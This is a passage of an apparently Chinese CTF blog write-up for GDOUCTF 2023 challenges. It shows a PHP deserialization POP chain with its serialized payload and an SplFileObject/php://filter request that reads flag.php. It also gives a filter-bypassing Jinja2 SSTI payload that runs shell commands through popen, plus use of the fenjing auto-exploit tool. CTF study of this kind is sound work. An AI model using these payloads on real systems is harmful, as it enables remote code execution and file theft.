+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>先找最终可利用的代码，发现<code>IPO()</code>中的<code>echo new $_POST[&#39;a&#39;]($_POST[&#39;b&#39;]);</code>可以利用<a href="https://c1oudfl0w0.github.io/blog/2023/03/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#SplFileObject">SplFileObject原生类</a>执行文件读取</p>
+<p>要执行<code>IPO()</code>就要先执行<code>hahaha()</code></p>
+<p>而<code>hahaha()</code>中对<code>classroom</code>类中的<code>name</code>属性和<code>leader</code>属性指向的<code>name</code>属性与<code>rank</code>属性有要求，也就说明<code>$leader=new teacher()</code></p>
+<p>那么链子就很清楚了，记得对序列化的结果进行base64编码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">teacher</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ing'</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$rank</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'department'</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$salary</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">classroom</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'one class'</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">school</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$department</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$headmaster</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ong'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">school</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">department</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">classroom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">department</span><span class="token operator">-></span><span class="token property">leader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">teacher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">//Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjozOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO3M6MTU6IgB0ZWFjaGVyAHNhbGFyeSI7Tjt9fXM6MTA6ImhlYWRtYXN0ZXIiO3M6Mzoib25nIjt9</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后就是POST请求利用原生类读取文件获得flag(base64编码)</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token operator">=</span>SplFileObject<span class="token operator">&amp;</span>b<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230425212010017.png" alt="image-20230425212010017"></p>
+<h2 id="lt-ez-ze-gt"><a href="#lt-ez-ze-gt" class="headerlink" title="&lt;ez_ze&gt;"></a>&lt;ez_ze&gt;</h2><blockquote>
+<p>SSTI</p>
+</blockquote>
+<h3 id="一把梭"><a href="#一把梭" class="headerlink" title="一把梭"></a>一把梭</h3><p>使用python的<a target="_blank" rel="noopener" href="https://github.com/Marven11/Fenjing">fenjing</a>库</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> fenjing<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>直接在命令行开梭获取shell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-m</span> fenjing scan <span class="token parameter variable">--url</span> http://node3.anna.nssctf.cn:28674<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230424210546150.png" alt="image-20230424210546150"></p>
+<p>找到flag位置在根目录下，直接cat即可</p>
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230424210652735.png" alt="image-20230424210652735"></p>
+<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>进去之后看到页面猜测是SSTI，直接<code>&#123;&#123;7*7&#125;&#125;</code>尝试</p>
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230423205526060.png" alt="image-20230423205526060"></p>
+<p>发现被过滤</p>
+<p>改成<code>&#123;%print(7*7)%&#125;</code>进行尝试</p>
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230423205621150.png" alt="image-20230423205621150"></p>
+<p>成功回显，则知道是过滤了<code>&#123;&#125;</code></p>
+<p>同时发现执行的文件与POST请求的参数</p>
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230424171633323.png" alt="image-20230424171633323"></p>
+<p>经过测试发现<code>_</code>,<code>[]</code>,<code>.</code>,<code>&quot;&quot;</code>都被过滤掉了</p>
+<p>那就查看可利用的字符尝试拼接变量</p>
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230424172619496.png" alt="image-20230424172619496"></p>
+<p>但是只有这些好像行不通。。。只能自己定义来实现拼接了</p>
+<p>首先我们知道最终的payload应该为</p>
+<pre class="line-numbers language-django" data-language="django"><code class="language-django">&#123;%print(().__class__.__bases__.__subclasses__().__getitem__[132].__init__.__globals__.__getitem__(popen)('ls').read())&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后根据题目过滤的字符进行对应的替换与拼接</p>
+<pre class="line-numbers language-django" data-language="django"><code class="language-django"><span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag keyword">set</span> <span class="token variable">po</span><span class="token operator">=</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token variable">po</span><span class="token operator">=</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">p</span><span class="token operator">=</span><span class="token variable">b</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token delimiter punctuation">%&#125;</span></span><span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag keyword">set</span> <span class="token variable">a</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">select</span><span class="token operator">|</span><span class="token filter function">string</span><span class="token operator">|</span><span class="token filter function">list</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">attr</span><span class="token punctuation">(</span><span class="token variable">po</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token delimiter punctuation">%&#125;</span></span><span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag keyword">set</span> <span class="token variable">ini</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token keyword">in</span><span class="token operator">=</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">it</span><span class="token operator">=</span><span class="token variable">b</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter punctuation">%&#125;</span></span><span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag keyword">set</span> <span class="token variable">glo</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token variable">glo</span><span class="token operator">=</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">bals</span><span class="token operator">=</span><span class="token variable">b</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter punctuation">%&#125;</span></span><span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag keyword">set</span> <span class="token variable">cls</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token variable">cla</span><span class="token operator">=</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">ss</span><span class="token operator">=</span><span class="token variable">b</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter punctuation">%&#125;</span></span><span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag keyword">set</span> <span class="token variable">bs</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token variable">bas</span><span class="token operator">=</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">e</span><span class="token operator">=</span><span class="token variable">b</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter punctuation">%&#125;</span></span><span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag keyword">set</span> <span class="token variable">geti</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token variable">get</span><span class="token operator">=</span><span class="token variable">a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token punctuation">,</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token variable">item</span><span class="token operator">=</span><span class="token variable">a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter punctuation">%&#125;</span></span><span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag keyword">set</span> <span class="token variable">subc</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token variable">subcla</span><span class="token operator">=</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">sses</span><span class="token operator">=</span><span class="token variable">b</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter punctuation">%&#125;</span></span><span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span> <span class="token tag keyword">set</span> <span class="token variable">pp</span><span class="token operator">=</span><span class="token function">dict</span><span class="token punctuation">(</span><span class="token variable">pop</span><span class="token operator">=</span><span class="token variable">a</span><span class="token punctuation">,</span><span class="token variable">en</span><span class="token operator">=</span><span class="token variable">b</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">join</span> <span class="token delimiter punctuation">%&#125;</span></span><span class="token django language-django"><span class="token delimiter punctuation">&#123;%</span><span class="token tag keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">attr</span><span class="token punctuation">(</span><span class="token variable">cls</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">attr</span><span class="token punctuation">(</span><span class="token variable">bs</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">attr</span><span class="token punctuation">(</span><span class="token variable">subc</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">attr</span><span class="token punctuation">(</span><span class="token variable">geti</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">132</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">attr</span><span class="token punctuation">(</span><span class="token variable">ini</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">attr</span><span class="token punctuation">(</span><span class="token variable">glo</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">attr</span><span class="token punctuation">(</span><span class="token variable">geti</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">pp</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'tac /flag'</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token filter function">attr</span><span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token delimiter punctuation">%&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/04/22/GDOUCTF-2023-%E5%A4%8D%E7%8E%B0/image-20230428195126529.png" alt="image-20230428195126529"></p>
+<p>emmm…感觉这种题只能多积累payload了</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
